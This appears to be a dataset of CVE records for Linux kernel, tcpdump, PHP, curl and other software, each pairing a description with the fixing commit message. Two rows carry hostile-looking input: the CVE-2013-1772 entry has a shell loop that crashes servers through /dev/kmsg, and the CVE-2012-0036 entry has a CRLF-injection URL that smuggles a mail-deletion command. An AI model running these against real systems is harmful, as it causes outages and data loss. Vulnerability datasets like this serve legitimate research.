CVE-2013-1772,CWE-119,2013-02-28,"The log_prefix function in kernel/printk.c in the Linux kernel 3.x before 3.4.33 does not properly remove a prefix string from a syslog header, which allows local users to cause a denial of service (buffer overflow and system crash) by leveraging /dev/kmsg write access and triggering a call_console_drivers function call.","This patch corrects a buffer overflow in kernels from 3.0 to 3.4 when calling log_prefix() function from call_console_drivers().  This bug existed in previous releases but has been revealed with commit 162a7e7 (2.6.39 => 3.0) that made changes about how to allocate memory for early printk buffer (use of memblock_alloc). It disappears with commit 7ff9554 (3.4 => 3.5) that does a refactoring of printk buffer management.  In log_prefix(), the access to ""p[0]"", ""p[1]"", ""p[2]"" or ""simple_strtoul(&p[1], &endp, 10)"" may cause a buffer overflow as this function is called from call_console_drivers by passing ""&LOG_BUF(cur_index)"" where the index must be masked to do not exceed the buffer's boundary.  The trick is to prepare in call_console_drivers() a buffer with the necessary data (PRI field of syslog message) to be safely evaluated in log_prefix().  This patch can be applied to stable kernel branches 3.0.y, 3.2.y and 3.4.y.  Without this patch, one can freeze a server running this loop from shell :   $ export DUMMY=`cat /dev/urandom | tr -dc '12345AZERTYUIOPQSDFGHJKLMWXCVBNazertyuiopqsdfghjklmwxcvbn' | head -c255`   $ while true do ; echo $DUMMY > /dev/kmsg ; done  The ""server freeze"" depends on where memblock_alloc does allocate printk buffer : if the buffer overflow is inside another kernel allocation the problem may not be revealed, else the server may hangs up.  Signed-off-by: Alexandre SIMON <Alexandre.Simon@univ-lorraine.fr> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2012-5532,,2012-12-27,"The main function in tools/hv/hv_kvp_daemon.c in hypervkvpd, as distributed in the Linux kernel before 3.8-rc1, allows local users to cause a denial of service (daemon exit) via a crafted application that sends a Netlink message.  NOTE: this vulnerability exists because of an incorrect fix for CVE-2012-2669.",The source code without this patch caused hypervkvpd to exit when it processed a spoofed Netlink packet which has been sent from an untrusted local user. Now Netlink messages with a non-zero nl_pid source address are ignored and a warning is printed into the syslog.  Signed-off-by: Tomas Hozza <thozza@redhat.com> Acked-by:  K. Y. Srinivasan <kys@microsoft.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
CVE-2008-1950,CWE-189,2008-05-21,"Integer signedness error in the _gnutls_ciphertext2compressed function in lib/gnutls_cipher.c in libgnutls in GnuTLS before 2.2.4 allows remote attackers to cause a denial of service (buffer over-read and crash) via a certain integer value in the Random field in an encrypted Client Hello message within a TLS record with an invalid Record Length, which leads to an invalid cipher padding length, aka GNUTLS-SA-2008-1-3.",
CVE-2016-5773,CWE-416,2016-08-07,"php_zip.c in the zip extension in PHP before 5.5.37, 5.6.x before 5.6.23, and 7.x before 7.0.8 improperly interacts with the unserialize implementation and garbage collection, which allows remote attackers to execute arbitrary code or cause a denial of service (use-after-free and application crash) via crafted serialized data containing a ZipArchive object.",
CVE-2016-3689,,2016-05-02,The ims_pcu_parse_cdc_data function in drivers/input/misc/ims-pcu.c in the Linux kernel before 4.5.1 allows physically proximate attackers to cause a denial of service (system crash) via a USB device without both a master and a slave interface.,A malicious device missing interface can make the driver oops. Add sanity checking.  Signed-off-by: Oliver Neukum <ONeukum@suse.com> CC: stable@vger.kernel.org Signed-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>
CVE-2017-13715,CWE-665,2017-08-29,"The __skb_flow_dissect function in net/core/flow_dissector.c in the Linux kernel before 4.3 does not ensure that n_proto, ip_proto, and thoff are initialized, which allows remote attackers to cause a denial of service (system crash) or possibly execute arbitrary code via a single crafted MPLS packet.",Instead of returning immediately (on a parsing failure for instance) we jump to cleanup code. This always sets protocol values in key_control (even on a failure there is still valid information in the key_tags that was set before the problem was hit).  Signed-off-by: Tom Herbert <tom@herbertland.com> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2016-9842,,2017-05-23,The inflateMark function in inflate.c in zlib 1.2.8 might allow context-dependent attackers to have unspecified impact via vectors involving left shifts of negative integers.,The C standard says that bit shifts of negative integers is undefined.  This casts to unsigned values to assure a known result.
CVE-2017-13051,CWE-125,2017-09-14,The RSVP parser in tcpdump before 4.9.2 has a buffer over-read in print-rsvp.c:rsvp_obj_print().,"Fixup the part of rsvp_obj_print() that decodes the GENERALIZED_UNI object from RFC 3476 Section 3.1 to check the sub-objects inside that object more thoroughly.  This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add a test using the capture file supplied by the reporter(s)."
CVE-2016-10192,CWE-119,2017-02-09,"Heap-based buffer overflow in ffserver.c in FFmpeg before 2.8.10, 3.0.x before 3.0.5, 3.1.x before 3.1.6, and 3.2.x before 3.2.2 allows remote attackers to execute arbitrary code by leveraging failure to check chunk size.",Fixes out of array access  Fixes: poc_ffserver.py Found-by: Paul Cher <paulcher@icloud.com> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
CVE-2015-8900,CWE-835,2017-02-27,The ReadHDRImage function in coders/hdr.c in ImageMagick 6.x and 7.x allows remote attackers to cause a denial of service (infinite loop) via a crafted HDR file.,
CVE-2014-5472,CWE-20,2014-09-01,The parse_rock_ridge_inode_internal function in fs/isofs/rock.c in the Linux kernel through 3.16.1 allows local users to cause a denial of service (unkillable mount process) via a crafted iso9660 image with a self-referential CL entry.,We did not check relocated directory in any way when processing Rock Ridge 'CL' tag. Thus a corrupted isofs image can possibly have a CL entry pointing to another CL entry leading to possibly unbounded recursion in kernel code and thus stack overflow or deadlocks (if there is a loop created from CL entries).  Fix the problem by not allowing CL entry to point to a directory entry with CL entry (such use makes no good sense anyway) and by checking whether CL entry doesn't point to itself.  CC: stable@vger.kernel.org Reported-by: Chris Evans <cevans@google.com> Signed-off-by: Jan Kara <jack@suse.cz>
CVE-2017-6310,CWE-125,2017-02-24,"An issue was discovered in tnef before 1.4.13. Four type confusions have been identified in the file_add_mapi_attrs() function. These might lead to invalid read and write operations, controlled by an attacker.",
CVE-2017-16525,CWE-416,2017-11-04,"The usb_serial_console_disconnect function in drivers/usb/serial/console.c in the Linux kernel before 4.13.8 allows local users to cause a denial of service (use-after-free and system crash) or possibly have unspecified other impact via a crafted USB device, related to disconnection and failed setup.","Make sure to reset the USB-console port pointer when console setup fails in order to avoid having the struct usb_serial be prematurely freed by the console code when the device is later disconnected.  Fixes: 73e487f (""[PATCH] USB console: fix disconnection issues"") Cc: stable <stable@vger.kernel.org>	# 2.6.18 Acked-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org> Signed-off-by: Johan Hovold <johan@kernel.org>"
CVE-2017-12894,CWE-125,2017-09-14,Several protocol parsers in tcpdump before 4.9.2 could cause a buffer over-read in addrtoname.c:lookup_bytestring().,"Otherwise, if, in our search of the hash table, we come across a byte string that's shorter than the string we're looking for, we'll search past the end of the string in the hash table.  This fixes a buffer over-read discovered by Forcepoint's security researchers Otto Airamo & Antti Levomäki.  Add a test using the capture file supplied by the reporter(s)."
CVE-2007-6762,CWE-119,2019-07-27,"In the Linux kernel before 2.6.20, there is an off-by-one bug in net/netlabel/netlabel_cipso_v4.c where it is possible to overflow the doi_def->tags[] array.",
CVE-2013-1774,CWE-264,2013-02-28,The chase_port function in drivers/usb/serial/io_ti.c in the Linux kernel before 3.7.4 allows local users to cause a denial of service (NULL pointer dereference and system crash) via an attempted /dev/ttyUSB read or write operation on a disconnected Edgeport USB serial converter.,"The tty is NULL when the port is hanging up. chase_port() needs to check for this.  This patch is intended for stable series. The behavior was observed and tested in Linux 3.2 and 3.7.1.  Johan Hovold submitted a more elaborate patch for the mainline kernel.  [   56.277883] usb 1-1: edge_bulk_in_callback - nonzero read bulk status received: -84 [   56.278811] usb 1-1: USB disconnect, device number 3 [   56.278856] usb 1-1: edge_bulk_in_callback - stopping read! [   56.279562] BUG: unable to handle kernel NULL pointer dereference at 00000000000001c8 [   56.280536] IP: [<ffffffff8144e62a>] _raw_spin_lock_irqsave+0x19/0x35 [   56.281212] PGD 1dc1b067 PUD 1e0f7067 PMD 0 [   56.282085] Oops: 0002 [#1] SMP [   56.282744] Modules linked in: [   56.283512] CPU 1 [   56.283512] Pid: 25, comm: khubd Not tainted 3.7.1 #1 innotek GmbH VirtualBox/VirtualBox [   56.283512] RIP: 0010:[<ffffffff8144e62a>]  [<ffffffff8144e62a>] _raw_spin_lock_irqsave+0x19/0x35 [   56.283512] RSP: 0018:ffff88001fa99ab0  EFLAGS: 00010046 [   56.283512] RAX: 0000000000000046 RBX: 00000000000001c8 RCX: 0000000000640064 [   56.283512] RDX: 0000000000010000 RSI: ffff88001fa99b20 RDI: 00000000000001c8 [   56.283512] RBP: ffff88001fa99b20 R08: 0000000000000000 R09: 0000000000000000 [   56.283512] R10: 0000000000000000 R11: ffffffff812fcb4c R12: ffff88001ddf53c0 [   56.283512] R13: 0000000000000000 R14: 00000000000001c8 R15: ffff88001e19b9f4 [   56.283512] FS:  0000000000000000(0000) GS:ffff88001fd00000(0000) knlGS:0000000000000000 [   56.283512] CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b [   56.283512] CR2: 00000000000001c8 CR3: 000000001dc51000 CR4: 00000000000006e0 [   56.283512] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000 [   56.283512] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400 [   56.283512] Process khubd (pid: 25, threadinfo ffff88001fa98000, task ffff88001fa94f80) [   56.283512] Stack: [   56.283512]  0000000000000046 00000000000001c8 ffffffff810578ec ffffffff812fcb4c [   56.283512]  ffff88001e19b980 0000000000002710 ffffffff812ffe81 0000000000000001 [   56.283512]  ffff88001fa94f80 0000000000000202 ffffffff00000001 0000000000000296 [   56.283512] Call Trace: [   56.283512]  [<ffffffff810578ec>] ? add_wait_queue+0x12/0x3c [   56.283512]  [<ffffffff812fcb4c>] ? usb_serial_port_work+0x28/0x28 [   56.283512]  [<ffffffff812ffe81>] ? chase_port+0x84/0x2d6 [   56.283512]  [<ffffffff81063f27>] ? try_to_wake_up+0x199/0x199 [   56.283512]  [<ffffffff81263a5c>] ? tty_ldisc_hangup+0x222/0x298 [   56.283512]  [<ffffffff81300171>] ? edge_close+0x64/0x129 [   56.283512]  [<ffffffff810612f7>] ? __wake_up+0x35/0x46 [   56.283512]  [<ffffffff8106135b>] ? should_resched+0x5/0x23 [   56.283512]  [<ffffffff81264916>] ? tty_port_shutdown+0x39/0x44 [   56.283512]  [<ffffffff812fcb4c>] ? usb_serial_port_work+0x28/0x28 [   56.283512]  [<ffffffff8125d38c>] ? __tty_hangup+0x307/0x351 [   56.283512]  [<ffffffff812e6ddc>] ? usb_hcd_flush_endpoint+0xde/0xed [   56.283512]  [<ffffffff8144e625>] ? _raw_spin_lock_irqsave+0x14/0x35 [   56.283512]  [<ffffffff812fd361>] ? usb_serial_disconnect+0x57/0xc2 [   56.283512]  [<ffffffff812ea99b>] ? usb_unbind_interface+0x5c/0x131 [   56.283512]  [<ffffffff8128d738>] ? __device_release_driver+0x7f/0xd5 [   56.283512]  [<ffffffff8128d9cd>] ? device_release_driver+0x1a/0x25 [   56.283512]  [<ffffffff8128d393>] ? bus_remove_device+0xd2/0xe7 [   56.283512]  [<ffffffff8128b7a3>] ? device_del+0x119/0x167 [   56.283512]  [<ffffffff812e8d9d>] ? usb_disable_device+0x6a/0x180 [   56.283512]  [<ffffffff812e2ae0>] ? usb_disconnect+0x81/0xe6 [   56.283512]  [<ffffffff812e4435>] ? hub_thread+0x577/0xe82 [   56.283512]  [<ffffffff8144daa7>] ? __schedule+0x490/0x4be [   56.283512]  [<ffffffff8105798f>] ? abort_exclusive_wait+0x79/0x79 [   56.283512]  [<ffffffff812e3ebe>] ? usb_remote_wakeup+0x2f/0x2f [   56.283512]  [<ffffffff812e3ebe>] ? usb_remote_wakeup+0x2f/0x2f [   56.283512]  [<ffffffff810570b4>] ? kthread+0x81/0x89 [   56.283512]  [<ffffffff81057033>] ? __kthread_parkme+0x5c/0x5c [   56.283512]  [<ffffffff8145387c>] ? ret_from_fork+0x7c/0xb0 [   56.283512]  [<ffffffff81057033>] ? __kthread_parkme+0x5c/0x5c [   56.283512] Code: 8b 7c 24 08 e8 17 0b c3 ff 48 8b 04 24 48 83 c4 10 c3 53 48 89 fb 41 50 e8 e0 0a c3 ff 48 89 04 24 e8 e7 0a c3 ff ba 00 00 01 00 <f0> 0f c1 13 48 8b 04 24 89 d1 c1 ea 10 66 39 d1 74 07 f3 90 66 [   56.283512] RIP  [<ffffffff8144e62a>] _raw_spin_lock_irqsave+0x19/0x35 [   56.283512]  RSP <ffff88001fa99ab0> [   56.283512] CR2: 00000000000001c8 [   56.283512] ---[ end trace 49714df27e1679ce ]---  Signed-off-by: Wolfgang Frisch <wfpub@roembden.net> Cc: Johan Hovold <jhovold@gmail.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2017-8069,CWE-119,2017-04-23,"drivers/net/usb/rtl8150.c in the Linux kernel 4.9.x before 4.9.11 interacts incorrectly with the CONFIG_VMAP_STACK option, which allows local users to cause a denial of service (system crash or memory corruption) or possibly have unspecified other impact by leveraging use of more than one virtual page for a DMA scatterlist.","Allocating USB buffers on the stack is not portable, and no longer works on x86_64 (with VMAP_STACK enabled as per default).  Fixes: 1da177e4c3f4 (""Linux-2.6.12-rc2"") Signed-off-by: Ben Hutchings <ben@decadent.org.uk> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2018-20169,CWE-400,2018-12-17,"An issue was discovered in the Linux kernel before 4.19.9. The USB subsystem mishandles size checks during the reading of an extra descriptor, related to __usb_get_extra_descriptor in drivers/usb/core/usb.c.","When reading an extra descriptor, we need to properly check the minimum and maximum size allowed, to prevent from invalid data being sent by a device.  Reported-by: Hui Peng <benquike@gmail.com> Reported-by: Mathias Payer <mathias.payer@nebelwelt.net> Co-developed-by: Linus Torvalds <torvalds@linux-foundation.org> Signed-off-by: Hui Peng <benquike@gmail.com> Signed-off-by: Mathias Payer <mathias.payer@nebelwelt.net> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org> Cc: stable <stable@kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2015-1573,CWE-19,2016-05-02,"The nft_flush_table function in net/netfilter/nf_tables_api.c in the Linux kernel before 3.18.5 mishandles the interaction between cross-chain jumps and ruleset flushes, which allows local users to cause a denial of service (panic) by leveraging the CAP_NET_ADMIN capability.","Jumping between chains doesn't mix well with flush ruleset. Rules from a different chain and set elements may still refer to us.  [  353.373791] ------------[ cut here ]------------ [  353.373845] kernel BUG at net/netfilter/nf_tables_api.c:1159! [  353.373896] invalid opcode: 0000 [#1] SMP [  353.373942] Modules linked in: intel_powerclamp uas iwldvm iwlwifi [  353.374017] CPU: 0 PID: 6445 Comm: 31c3.nft Not tainted 3.18.0 #98 [  353.374069] Hardware name: LENOVO 5129CTO/5129CTO, BIOS 6QET47WW (1.17 ) 07/14/2010 [...] [  353.375018] Call Trace: [  353.375046]  [<ffffffff81964c31>] ? nf_tables_commit+0x381/0x540 [  353.375101]  [<ffffffff81949118>] nfnetlink_rcv+0x3d8/0x4b0 [  353.375150]  [<ffffffff81943fc5>] netlink_unicast+0x105/0x1a0 [  353.375200]  [<ffffffff8194438e>] netlink_sendmsg+0x32e/0x790 [  353.375253]  [<ffffffff818f398e>] sock_sendmsg+0x8e/0xc0 [  353.375300]  [<ffffffff818f36b9>] ? move_addr_to_kernel.part.20+0x19/0x70 [  353.375357]  [<ffffffff818f44f9>] ? move_addr_to_kernel+0x19/0x30 [  353.375410]  [<ffffffff819016d2>] ? verify_iovec+0x42/0xd0 [  353.375459]  [<ffffffff818f3e10>] ___sys_sendmsg+0x3f0/0x400 [  353.375510]  [<ffffffff810615fa>] ? native_sched_clock+0x2a/0x90 [  353.375563]  [<ffffffff81176697>] ? acct_account_cputime+0x17/0x20 [  353.375616]  [<ffffffff8110dc78>] ? account_user_time+0x88/0xa0 [  353.375667]  [<ffffffff818f4bbd>] __sys_sendmsg+0x3d/0x80 [  353.375719]  [<ffffffff81b184f4>] ? int_check_syscall_exit_work+0x34/0x3d [  353.375776]  [<ffffffff818f4c0d>] SyS_sendmsg+0xd/0x20 [  353.375823]  [<ffffffff81b1826d>] system_call_fastpath+0x16/0x1b  Release objects in this order: rules -> sets -> chains -> tables, to make sure no references to chains are held anymore.  Reported-by: Asbjoern Sloth Toennesen <asbjorn@asbjorn.biz> Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>"
CVE-2019-15163,CWE-476,2019-10-03,rpcapd/daemon.c in libpcap before 1.9.1 allows attackers to cause a denial of service (NULL pointer dereference and daemon crash) if a crypt() call fails.,"It can fail, so make sure it doesn't before comparing its result with the password.  This addresses Include Security issue F12: [libpcap] Remote Packet Capture Daemon Null Pointer Dereference Denial of Service."
CVE-2011-1428,CWE-20,2011-03-16,"Wee Enhanced Environment for Chat (aka WeeChat) 0.3.4 and earlier does not properly verify that the server hostname matches the domain name of the subject of an X.509 certificate, which allows man-in-the-middle attackers to spoof an SSL chat server via an arbitrary certificate, related to incorrect use of the GnuTLS API.",
CVE-2017-6310,CWE-125,2017-02-24,"An issue was discovered in tnef before 1.4.13. Four type confusions have been identified in the file_add_mapi_attrs() function. These might lead to invalid read and write operations, controlled by an attacker.",
CVE-2016-9935,CWE-125,2017-01-04,The php_wddx_push_element function in ext/wddx/wddx.c in PHP before 5.6.29 and 7.x before 7.0.14 allows remote attackers to cause a denial of service (out-of-bounds read and memory corruption) or possibly have unspecified other impact via an empty boolean element in a wddxPacket XML document.,
CVE-2013-7271,CWE-20,2014-01-06,"The x25_recvmsg function in net/x25/af_x25.c in the Linux kernel before 3.12.4 updates a certain length value without ensuring that an associated data structure has been initialized, which allows local users to obtain sensitive information from kernel memory via a (1) recvfrom, (2) recvmmsg, or (3) recvmsg system call.","This patch now always passes msg->msg_namelen as 0. recvmsg handlers must set msg_namelen to the proper size <= sizeof(struct sockaddr_storage) to return msg_name to the user.  This prevents numerous uninitialized memory leaks we had in the recvmsg handlers and makes it harder for new code to accidentally leak uninitialized memory.  Optimize for the case recvfrom is called with NULL as address. We don't need to copy the address at all, so set it to NULL before invoking the recvmsg handler. We can do so, because all the recvmsg handlers must cope with the case a plain read() is called on them. read() also sets msg_name to NULL.  Also document these changes in include/linux/net.h as suggested by David Miller.  Changes since RFC:  Set msg->msg_name = NULL if user specified a NULL in msg_name but had a non-null msg_namelen in verify_iovec/verify_compat_iovec. This doesn't affect sendto as it would bail out earlier while trying to copy-in the address. It also more naturally reflects the logic by the callers of verify_iovec.  With this change in place I could remove "" if (!uaddr || msg_sys->msg_namelen == 0) 	msg->msg_name = NULL "".  This change does not alter the user visible error logic as we ignore msg_namelen as long as msg_name is NULL.  Also remove two unnecessary curly brackets in ___sys_recvmsg and change comments to netdev style.  Cc: David Miller <davem@davemloft.net> Suggested-by: Eric Dumazet <eric.dumazet@gmail.com> Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2013-3234,CWE-200,2013-04-22,"The rose_recvmsg function in net/rose/af_rose.c in the Linux kernel before 3.9-rc7 does not initialize a certain data structure, which allows local users to obtain sensitive information from kernel stack memory via a crafted recvmsg or recvfrom system call.",The code in rose_recvmsg() does not initialize all of the members of struct sockaddr_rose/full_sockaddr_rose when filling the sockaddr info. Nor does it initialize the padding bytes of the structure inserted by the compiler for alignment. This will lead to leaking uninitialized kernel stack bytes in net/socket.c.  Fix the issue by initializing the memory used for sockaddr info with memset(0).  Cc: Ralf Baechle <ralf@linux-mips.org> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2017-7895,CWE-119,2017-04-28,"The NFSv2 and NFSv3 server implementations in the Linux kernel through 4.10.13 lack certain checks for the end of a buffer, which allows remote attackers to trigger pointer-arithmetic errors or possibly have unspecified other impact via crafted requests, related to fs/nfsd/nfs3xdr.c and fs/nfsd/nfsxdr.c.","The NFSv2/v3 code does not systematically check whether we decode past the end of the buffer.  This generally appears to be harmless, but there are a few places where we do arithmetic on the pointers involved and don't account for the possibility that a length could be negative.  Add checks to catch these.  Reported-by: Tuomas Haanpää <thaan@synopsys.com> Reported-by: Ari Kauppi <ari@synopsys.com> Reviewed-by: NeilBrown <neilb@suse.com> Cc: stable@vger.kernel.org Signed-off-by: J. Bruce Fields <bfields@redhat.com>"
CVE-2009-1194,CWE-189,2009-05-11,"Integer overflow in the pango_glyph_string_set_size function in pango/glyphstring.c in Pango before 1.24 allows context-dependent attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a long glyph string that triggers a heap-based buffer overflow, as demonstrated by a long document.location value in Firefox.",
CVE-2015-6563,CWE-20,2015-08-24,"The monitor component in sshd in OpenSSH before 7.0 on non-OpenBSD platforms accepts extraneous username data in MONITOR_REQ_PAM_INIT_CTX requests, which allows local users to conduct impersonation attacks by leveraging any SSH login access in conjunction with control of the sshd uid to send a crafted MONITOR_REQ_PWNAM request, related to monitor.c and monitor_wrap.c.",Pointed out by Moritz Jodeit; ok dtucker@
CVE-2013-7348,CWE-399,2014-04-01,Double free vulnerability in the ioctx_alloc function in fs/aio.c in the Linux kernel before 3.12.4 allows local users to cause a denial of service (system crash) or possibly have unspecified other impact via vectors involving an error condition in the aio_setup_ring function.,"ioctx_alloc() calls aio_setup_ring() to allocate a ring. If aio_setup_ring() fails to do so it would call aio_free_ring() before returning, but ioctx_alloc() would call aio_free_ring() again causing a double free of the ring.  This is easily reproducible from userspace.  Signed-off-by: Sasha Levin <sasha.levin@oracle.com> Signed-off-by: Benjamin LaHaise <bcrl@kvack.org>"
CVE-2013-1773,CWE-119,2013-02-28,"Buffer overflow in the VFAT filesystem implementation in the Linux kernel before 3.3 allows local users to gain privileges or cause a denial of service (system crash) via a VFAT write operation on a filesystem with the utf8 mount option, which is not properly handled during UTF-8 to UTF-16 conversion.","The utf8s_to_utf16s conversion routine needs to be improved.  Unlike its utf16s_to_utf8s sibling, it doesn't accept arguments specifying the maximum length of the output buffer or the endianness of its 16-bit output.  This patch (as1501) adds the two missing arguments, and adjusts the only two places in the kernel where the function is called.  A follow-on patch will add a third caller that does utilize the new capabilities.  The two conversion routines are still annoyingly inconsistent in the way they handle invalid byte combinations.  But that's a subject for a different patch.  Signed-off-by: Alan Stern <stern@rowland.harvard.edu> CC: Clemens Ladisch <clemens@ladisch.de> Signed-off-by: Greg Kroah-Hartman <gregkh@suse.de>"
CVE-2017-12993,CWE-125,2017-09-14,"The Juniper protocols parser in tcpdump before 4.9.2 has a buffer over-read in print-juniper.c, several functions.",This fixes a buffer over-read discovered by Kamil Frankowicz.  Add tests using the capture files supplied by the reporter(s).
CVE-2015-8950,CWE-200,2016-10-10,"arch/arm64/mm/dma-mapping.c in the Linux kernel before 4.0.3, as used in the ION subsystem in Android and other products, does not initialize certain data structures, which allows local users to obtain sensitive information from kernel memory by triggering a dma_mmap call.","Buffers allocated by dma_alloc_coherent() are always zeroed on Alpha, ARM (32bit), MIPS, PowerPC, x86/x86_64 and probably other architectures. It turned out that some drivers rely on this 'feature'. Allocated buffer might be also exposed to userspace with dma_mmap() call, so clearing it is desired from security point of view to avoid exposing random memory to userspace. This patch unifies dma_alloc_coherent() behavior on ARM64 architecture with other implementations by unconditionally zeroing allocated buffer.  Cc: <stable@vger.kernel.org> # v3.14+ Signed-off-by: Marek Szyprowski <m.szyprowski@samsung.com> Signed-off-by: Will Deacon <will.deacon@arm.com>"
CVE-2012-0036,CWE-89,2012-04-13,"curl and libcurl 7.2x before 7.24.0 do not properly consider special characters during extraction of a pathname from a URL, which allows remote attackers to conduct data-injection attacks via a crafted URL, as demonstrated by a CRLF injection attack on the (1) IMAP, (2) POP3, or (3) SMTP protocol.","Protocols (IMAP, POP3 and SMTP) that use the path part of a URL in a decoded manner now use the new Curl_urldecode() function to reject URLs with embedded control codes (anything that is or decodes to a byte value less than 32).  URLs containing such codes could easily otherwise be used to do harm and allow users to do unintended actions with otherwise innocent tools and applications. Like for example using a URL like pop3://pop3.example.com/1%0d%0aDELE%201 when the app wants a URL to get a mail and instead this would delete one.  This flaw is considered a security vulnerability: CVE-2012-0036  Security advisory at: http://curl.haxx.se/docs/adv_20120124.html  Reported by: Dan Fandrich"
CVE-2014-7841,CWE-399,2014-11-30,"The sctp_process_param function in net/sctp/sm_make_chunk.c in the SCTP implementation in the Linux kernel before 3.17.4, when ASCONF is used, allows remote attackers to cause a denial of service (NULL pointer dereference and system crash) via a malformed INIT chunk.","An SCTP server doing ASCONF will panic on malformed INIT ping-of-death in the form of:    ------------ INIT[PARAM: SET_PRIMARY_IP] ------------>  While the INIT chunk parameter verification dissects through many things in order to detect malformed input, it misses to actually check parameters inside of parameters. E.g. RFC5061, section 4.2.4 proposes a 'set primary IP address' parameter in ASCONF, which has as a subparameter an address parameter.  So an attacker may send a parameter type other than SCTP_PARAM_IPV4_ADDRESS or SCTP_PARAM_IPV6_ADDRESS, param_type2af() will subsequently return 0 and thus sctp_get_af_specific() returns NULL, too, which we then happily dereference unconditionally through af->from_addr_param().  The trace for the log:  BUG: unable to handle kernel NULL pointer dereference at 0000000000000078 IP: [<ffffffffa01e9c62>] sctp_process_init+0x492/0x990 [sctp] PGD 0 Oops: 0000 [#1] SMP [...] Pid: 0, comm: swapper Not tainted 2.6.32-504.el6.x86_64 #1 Bochs Bochs RIP: 0010:[<ffffffffa01e9c62>]  [<ffffffffa01e9c62>] sctp_process_init+0x492/0x990 [sctp] [...] Call Trace:  <IRQ>  [<ffffffffa01f2add>] ? sctp_bind_addr_copy+0x5d/0xe0 [sctp]  [<ffffffffa01e1fcb>] sctp_sf_do_5_1B_init+0x21b/0x340 [sctp]  [<ffffffffa01e3751>] sctp_do_sm+0x71/0x1210 [sctp]  [<ffffffffa01e5c09>] ? sctp_endpoint_lookup_assoc+0xc9/0xf0 [sctp]  [<ffffffffa01e61f6>] sctp_endpoint_bh_rcv+0x116/0x230 [sctp]  [<ffffffffa01ee986>] sctp_inq_push+0x56/0x80 [sctp]  [<ffffffffa01fcc42>] sctp_rcv+0x982/0xa10 [sctp]  [<ffffffffa01d5123>] ? ipt_local_in_hook+0x23/0x28 [iptable_filter]  [<ffffffff8148bdc9>] ? nf_iterate+0x69/0xb0  [<ffffffff81496d10>] ? ip_local_deliver_finish+0x0/0x2d0  [<ffffffff8148bf86>] ? nf_hook_slow+0x76/0x120  [<ffffffff81496d10>] ? ip_local_deliver_finish+0x0/0x2d0 [...]  A minimal way to address this is to check for NULL as we do on all other such occasions where we know sctp_get_af_specific() could possibly return with NULL.  Fixes: d6de309 (""[SCTP]: Add the handling of ""Set Primary IP Address"" parameter to INIT"") Signed-off-by: Daniel Borkmann <dborkman@redhat.com> Cc: Vlad Yasevich <vyasevich@gmail.com> Acked-by: Neil Horman <nhorman@tuxdriver.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2011-1428,CWE-20,2011-03-16,"Wee Enhanced Environment for Chat (aka WeeChat) 0.3.4 and earlier does not properly verify that the server hostname matches the domain name of the subject of an X.509 certificate, which allows man-in-the-middle attackers to spoof an SSL chat server via an arbitrary certificate, related to incorrect use of the GnuTLS API.",
CVE-2013-0281,CWE-399,2013-11-23,"Pacemaker 1.1.10, when remote Cluster Information Base (CIB) configuration or resource management is enabled, does not limit the duration of connections to the blocking sockets, which allows remote attackers to cause a denial of service (connection blocking).",
CVE-2016-2543,,2016-04-27,"The snd_seq_ioctl_remove_events function in sound/core/seq/seq_clientmgr.c in the Linux kernel before 4.4.1 does not verify FIFO assignment before proceeding with FIFO clearing, which allows local users to cause a denial of service (NULL pointer dereference and OOPS) via a crafted ioctl call.","snd_seq_ioctl_remove_events() calls snd_seq_fifo_clear() unconditionally even if there is no FIFO assigned, and this leads to an Oops due to NULL dereference.  The fix is just to add a proper NULL check.  Reported-by: Dmitry Vyukov <dvyukov@google.com> Tested-by: Dmitry Vyukov <dvyukov@google.com> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>"
CVE-2012-6536,CWE-200,2013-03-15,"net/xfrm/xfrm_user.c in the Linux kernel before 3.6 does not verify that the actual Netlink message length is consistent with a certain header field, which allows local users to obtain sensitive information from kernel heap memory by leveraging the CAP_NET_ADMIN capability and providing a (1) new or (2) updated state.","The current code fails to ensure that the netlink message actually contains as many bytes as the header indicates. If a user creates a new state or updates an existing one but does not supply the bytes for the whole ESN replay window, the kernel copies random heap bytes into the replay bitmap, the ones happen to follow the XFRMA_REPLAY_ESN_VAL netlink attribute. This leads to following issues:  1. The replay window has random bits set confusing the replay handling    code later on.  2. A malicious user could use this flaw to leak up to ~3.5kB of heap    memory when she has access to the XFRM netlink interface (requires    CAP_NET_ADMIN).  Known users of the ESN replay window are strongSwan and Steffen's iproute2 patch (<http://patchwork.ozlabs.org/patch/85962/>). The latter uses the interface with a bitmap supplied while the former does not. strongSwan is therefore prone to run into issue 1.  To fix both issues without breaking existing userland allow using the XFRMA_REPLAY_ESN_VAL netlink attribute with either an empty bitmap or a fully specified one. For the former case we initialize the in-kernel bitmap with zero, for the latter we copy the user supplied bitmap. For state updates the full bitmap must be supplied.  To prevent overflows in the bitmap length calculation the maximum size of bmp_len is limited to 128 by this patch -- resulting in a maximum replay window of 4096 packets. This should be sufficient for all real life scenarios (RFC 4303 recommends a default replay window size of 64).  Cc: Steffen Klassert <steffen.klassert@secunet.com> Cc: Martin Willi <martin@revosec.ch> Cc: Ben Hutchings <bhutchings@solarflare.com> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
